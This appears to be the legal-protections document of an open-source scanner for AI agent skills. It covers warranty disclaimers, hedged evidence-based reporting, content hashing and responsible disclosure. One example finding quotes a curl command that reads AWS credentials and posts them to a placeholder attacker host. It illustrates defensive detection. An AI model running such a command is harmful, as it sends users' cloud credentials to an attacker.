# OSTRTA Legal Protections

**Last Updated:** 2026-01-31

This document describes how OSTRTA is legally protected against potential liability claims.

---

## Legal Risks

OSTRTA faces two primary legal risks:

1. **False negatives** - A user installs a skill OSTRTA marked as safe, which turns out to be malicious
2. **False positives** - A skill author claims OSTRTA defamed them by incorrectly flagging their skill

## How OSTRTA is Protected

### 1. MIT License with Warranty Disclaimer

**Implementation:** See [../LICENSE](../LICENSE)

OSTRTA is released under the MIT License, which includes:

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
```

**What this means:**
- No promise that OSTRTA works for security scanning
- No promise that it detects all threats
- No liability for damages arising from use

This is the **primary legal protection** and is industry-standard for security tools.

---

### 2. Security-Specific Disclaimer

**Implementation:** See [../DISCLAIMER.md](../DISCLAIMER.md)

OSTRTA includes a comprehensive disclaimer that appears:
- In the repository (DISCLAIMER.md)
- In every analysis report (SKILL.md output)
- Prominently in README.md

**Key disclaimers:**
- ✅ "Cannot guarantee detection of all malicious content"
- ✅ "May produce false positives or false negatives"
- ✅ "A 'SAFE' verdict is not a security certification"
- ✅ "User assumes all risk when installing skills"
- ✅ "Not a substitute for professional security review"

---

### 3. Factual, Evidence-Based Reporting

**Implementation:** OSTRTA's reporting methodology (SKILL.md)

OSTRTA protects against defamation claims by:

#### 3.1 Reporting Facts, Not Accusations

✅ **What OSTRTA does:**
- "Line 42 contains: `curl evil.com -d $(cat ~/.aws/credentials)`"
- "OSTRTA detected pattern matching data exfiltration"
- "This pattern is commonly associated with credential theft"

❌ **What OSTRTA avoids:**
- "The author is a criminal"
- "This is definitely malware"
- "Designed to steal your data"

#### 3.2 Showing Evidence

Every finding includes:
- Exact line number
- Quoted evidence from the skill
- Specific pattern that triggered detection
- Category classification (e.g., PROMPT_INJECTION, DATA_EXFILTRATION)

This makes reports **verifiable and defensible**.

#### 3.3 Qualified Language

OSTRTA uses hedging language:
- "OSTRTA analysis indicates..."
- "This pattern appears to..."
- "Commonly associated with..."
- "Review findings yourself"

Not definitive claims like "IS malicious" or "WILL steal data."

#### 3.4 Public Interest Defense

Security research serves a legitimate public interest. OSTRTA's findings help users make informed decisions about skill installation, which courts generally protect as good-faith security disclosure.

---

### 4. Content Hashing for Verification

**Implementation:** Every OSTRTA report includes SHA-256 hash

Every analysis includes:
```
Content Hash: [SHA-256 of analyzed content]
Analysis Timestamp: [ISO 8601 UTC]
OSTRTA Version: SKILL.md v1.0
```

**Purpose:**
- Proves exactly what content was analyzed
- Prevents claims that "the skill was different when you analyzed it"
- Creates verifiable audit trail

---

### 5. Responsible Disclosure Policy

**Implementation:** See [RESPONSIBLE_DISCLOSURE.md](RESPONSIBLE_DISCLOSURE.md)

OSTRTA has a formal process for:
- Reporting bypasses/false negatives privately
- Giving time to fix before public disclosure
- Coordinated disclosure timeline

This demonstrates good faith and follows security industry norms.

---

## What OSTRTA Does NOT Have

### No Website/Terms of Service

OSTRTA is a **SKILL.md file only** - there's no hosted service, no website, no API. Therefore:
- ❌ No Terms of Service needed
- ❌ No Privacy Policy needed
- ❌ No user accounts or data collection

**Why this matters:** Significantly reduces legal surface area. No website = no website liability.

### No Business Entity

OSTRTA is an open-source project, not a commercial service. There's:
- ❌ No LLC or corporation
- ❌ No insurance policy
- ❌ No paid services

**Why this matters:** MIT License + open source = minimal liability exposure.

---

## Summary: Defense in Depth

OSTRTA's legal protections layer multiple safeguards:

| Layer | Protection | Location |
|-------|-----------|----------|
| **License** | MIT warranty disclaimer | LICENSE |
| **Disclaimer** | Security-specific limitations | DISCLAIMER.md, SKILL.md |
| **Methodology** | Factual, evidence-based reporting | SKILL.md |
| **Verification** | Content hashing | Every report |
| **Process** | Responsible disclosure | RESPONSIBLE_DISCLOSURE.md |

**Together:** These create robust protection appropriate for an open-source security analysis tool.

---

## Best Practices (For OSTRTA Maintainers)

When maintaining OSTRTA:

✅ **Do:**
- Keep findings factual and evidence-based
- Include exact quotes and line numbers
- Use qualified language ("appears to", "may indicate")
- Document methodology clearly
- Respond to false positive reports promptly

❌ **Don't:**
- Make accusations about author intent
- Use inflammatory language
- Claim 100% accuracy
- Remove disclaimers from output
- Make definitive "is malicious" statements

---

## For Users: What This Means

**You are responsible for your decisions.**

OSTRTA provides analysis and evidence, but:
- You decide whether to trust findings
- You decide whether to install skills
- You assume all risk of installation

**The disclaimers protect OSTRTA's contributors, not you.** Always review skills yourself.

---

## For Skill Authors: If You're Flagged

If OSTRTA flags your skill as malicious:

1. **Review the evidence** - OSTRTA shows exactly what triggered detection
2. **Check for false positives** - See [../USING_OSTRTA.md](../USING_OSTRTA.md) for common false positive patterns
3. **Open an issue** - Report false positives via GitHub Issues
4. **Improve your skill** - Remove patterns that look suspicious, even if benign

**OSTRTA is not claiming you're malicious** - it's reporting that certain patterns were detected. You can dispute findings through GitHub Issues.

---

## Legal Strategy: Why This Works

The combination of:
1. Open source license warranty disclaimer
2. Security-specific limitations prominently displayed
3. Factual, evidence-based reporting methodology
4. No commercial service or business entity

...creates **strong legal protection** for a security analysis tool.

**No disclaimer is absolute**, but this approach:
- Follows industry standards (security tools universally disclaim warranties)
- Aligns with legal precedent (good-faith security research is generally protected)
- Minimizes attack surface (no website, no ToS to dispute, no service to sue)
- Demonstrates good faith (responsible disclosure, evidence-based reports)

---

## Further Reading

- [DISCLAIMER.md](../DISCLAIMER.md) - Full legal disclaimer
- [RESPONSIBLE_DISCLOSURE.md](RESPONSIBLE_DISCLOSURE.md) - How to report bypasses
- [COMPARISON.md](../COMPARISON.md) - Design philosophy (simplicity reduces liability)
- [LICENSE](../LICENSE) - MIT License text
